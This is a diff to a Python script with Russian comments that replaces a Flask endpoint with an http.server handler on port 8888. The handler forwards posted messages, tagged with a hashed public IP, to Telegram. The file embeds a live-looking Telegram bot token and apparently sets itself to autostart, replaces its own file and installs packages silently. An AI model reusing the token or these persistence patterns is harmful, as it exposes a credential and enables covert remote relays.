@@ -6,13 +6,15 @@ import platform
 import requests
 from time import sleep
 from threading import Thread
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import parse_qs
 
 # Функция для установки необходимого пакета
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
 # Сначала проверяем и устанавливаем необходимые пакеты
-required_packages = ['requests', 'flask']
+required_packages = ['requests']
 
 for package in required_packages:
     try:
@@ -21,7 +23,7 @@ for package in required_packages:
         install(package)
 
 # Теперь можно импортировать пакеты
-from flask import Flask, request
+import requests
 
 # Токен и Chat ID для Telegram
 bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'
@@ -96,35 +98,47 @@ def replace_script_file():
     except Exception as e:
         print(f"Error replacing the file: {e}")
 
-# Flask-приложение для прослушивания сообщений на порту 8888
-app = Flask(__name__)
+# Класс для обработки HTTP-запросов
+class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        # Чтение данных запроса
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
 
-@app.route('/send_message', methods=['POST'])
-def handle_message():
-    message = request.form.get('message', '')
-    if message:
-        # Получаем публичный IP и хешируем его
-        public_ip = get_public_ip()
-        if public_ip:
-            hashed_ip = hash_ip(public_ip)
-            # Добавляем хешированный IP в конец сообщения
-            message += f"\n#{hashed_ip}"
+        # Преобразуем данные в строку
+        message = post_data.decode('utf-8')
 
-            # Отправляем сообщение в Telegram
-            send_message_to_telegram(message)
-            return "Message received and sent to Telegram.", 200
+        if message:
+            # Получаем публичный IP и хешируем его
+            public_ip = get_public_ip()
+            if public_ip:
+                hashed_ip = hash_ip(public_ip)
+                # Добавляем хешированный IP в конец сообщения
+                message += f"\n#{hashed_ip}"
+
+                # Отправляем сообщение в Telegram
+                send_message_to_telegram(message)
+
+                # Отправляем ответ на запрос
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b"Message received and sent to Telegram.")
+            else:
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(b"Failed to retrieve public IP.")
         else:
-            return "Failed to retrieve public IP.", 500
-    return "No message received.", 400
+            self.send_response(400)
+            self.end_headers()
+            self.wfile.write(b"No message received.")
 
-# Функция для запуска сервера и обработки ошибок
-def start_server():
-    try:
-        app.run(host='0.0.0.0', port=8888, threaded=True)
-    except Exception as e:
-        print(f"Error starting the server: {e}")
-        sleep(5)  # Пауза перед перезапуском
-        start_server()  # Перезапуск сервера
+# Запуск HTTP-сервера
+def run_server():
+    server_address = ('0.0.0.0', 8888)
+    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
+    print("Server started on port 8888...")
+    httpd.serve_forever()
 
 # Устанавливаем автозапуск текущего скрипта
 def setup_autostart():
@@ -209,7 +223,7 @@ if __name__ == '__main__':
     replace_script_file()
 
     # Запускаем сервер для прослушивания сообщений
-    server_thread = Thread(target=start_server)
+    server_thread = Thread(target=run_server)
     server_thread.daemon = True
     server_thread.start()
 
